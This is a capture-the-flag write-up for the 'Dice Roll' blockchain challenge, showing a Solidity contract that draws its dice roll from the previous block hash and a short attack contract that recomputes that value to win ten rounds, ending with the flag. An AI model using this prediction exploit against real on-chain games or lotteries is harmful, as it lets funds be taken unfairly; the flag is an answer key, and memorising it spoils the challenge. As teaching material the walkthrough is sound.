## Challenge Name: Dice Roll 擲骰仔<br> (Category: Blockchain, Points: 453, Solves: 17)

Solve by T004 - Nessie explode 4


Challenge Description: <br>

>I bet you can't guess it.<br>
>我賭你估唔到。<br>
>http://chal.polyuctf.com:11337/<br>
>Flag format 格式: PUCTF24{xxx}<br>
>Author 作者: Sunny<br>

### Briefly explain
The game require us to guess the right number for 10 times<br>
So, we create a Attack contract to predict what the next blockValue <br>
As first few variables are always the same, what we predict must equal to system number(diceRoll) <br>
--> repeat 10 times(diceRoll == _guess) --> flag <br>
### Approach

1. Chick Get new Instance & Get the instance
<img src="https://github.com/Mini-Touch/Dice-Roll-writeup-PolyU-x-NuttyShell-Cybersecurity-CTF-2024/blob/main/Png%20Folder/new_instance%26instance_address.png" border="0">
   
2. Open [Remix - Ethereum IDE](https://remix.ethereum.org/#lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.24+commit.e11b9ed9.js)--> create a new .sol file --> copy the code from [Dice Roll](http://chal.polyuctf.com:11337/level/0x0A14079e1215a4758Aa0215B50581A225930f721)

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DiceRoll {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 ram = 2023;

  constructor() {
    consecutiveWins = 0;
  }

  function roll(uint256 _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 diceRoll = blockValue / ram % 6;

    if (diceRoll == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```
<img src="https://github.com/Mini-Touch/Dice-Roll-writeup-PolyU-x-NuttyShell-Cybersecurity-CTF-2024/blob/main/Png%20Folder/copy.png" border="0">

3. Setup the attack Code
```
contract Attact{
    DiceRoll anit_roll = DiceRoll(<Instance address>);
    uint256 ram = 2023;

    function attact() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 diceRoll = blockValue / ram % 6;

        anit_roll.roll(diceRoll);
    }
}
```
<img src="https://github.com/Mini-Touch/Dice-Roll-writeup-PolyU-x-NuttyShell-Cybersecurity-CTF-2024/blob/main/Png%20Folder/add_attack.png?raw=true" border="0">

4. Compile(Ctrl + S) --> change environment --> deploy --> attact<br>
<p align="left">
<img src="https://github.com/Mini-Touch/Dice-Roll-writeup-PolyU-x-NuttyShell-Cybersecurity-CTF-2024/blob/main/Png%20Folder/environment.png" width="320" height="900">
   
<img src="https://github.com/Mini-Touch/Dice-Roll-writeup-PolyU-x-NuttyShell-Cybersecurity-CTF-2024/blob/main/Png%20Folder/deploy.png" width="320" height="900">

<img src="https://github.com/Mini-Touch/Dice-Roll-writeup-PolyU-x-NuttyShell-Cybersecurity-CTF-2024/blob/main/Png%20Folder/attack.png" width="320" height="900">
</p>
After you chick attack, you may check the times of suesses by code below

```
fromWei(await contract.consecutiveWins())
```

<img src="https://github.com/Mini-Touch/Dice-Roll-writeup-PolyU-x-NuttyShell-Cybersecurity-CTF-2024/blob/main/Png%20Folder/check.png" border="0">

5. Flag
- After attacked 10 times

<img src="https://github.com/Mini-Touch/Dice-Roll-writeup-PolyU-x-NuttyShell-Cybersecurity-CTF-2024/blob/main/Png%20Folder/enter_10times.png" border="0">

- Chick Submit instance and get the flag
<img src="https://github.com/Mini-Touch/Dice-Roll-writeup-PolyU-x-NuttyShell-Cybersecurity-CTF-2024/blob/main/Png%20Folder/flag.png" border="0">

### Flag
Flag: PUCTF24{n0_r3n4omn3ss_1n_bl0ckch41n_vuLptYG7wexbBQ8ZvtYhGU2MdW4uT7po}

### Reference
https://ctf-wiki.org/blockchain/ethereum/attacks/randomness/<br>
https://www.youtube.com/watch?v=YGIDhidOwFM<br>
https://ethernaut.openzeppelin.com/
